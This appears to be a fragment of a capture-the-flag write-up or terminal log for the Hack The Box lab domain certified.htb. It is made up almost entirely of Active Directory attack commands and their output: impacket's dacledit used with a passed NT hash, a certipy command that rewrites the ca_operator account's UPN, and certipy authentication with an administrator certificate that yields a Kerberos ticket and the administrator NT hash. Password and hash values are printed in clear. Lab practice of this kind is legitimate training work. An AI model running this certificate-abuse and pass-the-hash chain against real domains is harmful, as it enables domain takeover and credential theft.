kali@kali ~> dacledit.py -action 'read' -rights 'FullControl' -principal 'SawyerDomain' -target 'ca_operator' 'certified.htb'/'administrator' -hashes 'aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34'
/usr/local/bin/dacledit.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'dacledit.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-729746778-2675978091-3820388244-5603)
[*]   ACE[21] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : SawyerDomain (S-1-5-21-729746778-2675978091-3820388244-5603)
```

```
kali@kali ~> certipy account update -username "SawyerDomain@certified.htb" -password "password123" -user ca_operator -upn "ca_operator@certified.htb"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

```
kali@kali ~> certipy auth -pfx 'administrator.pfx' -domain "certified.htb"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```


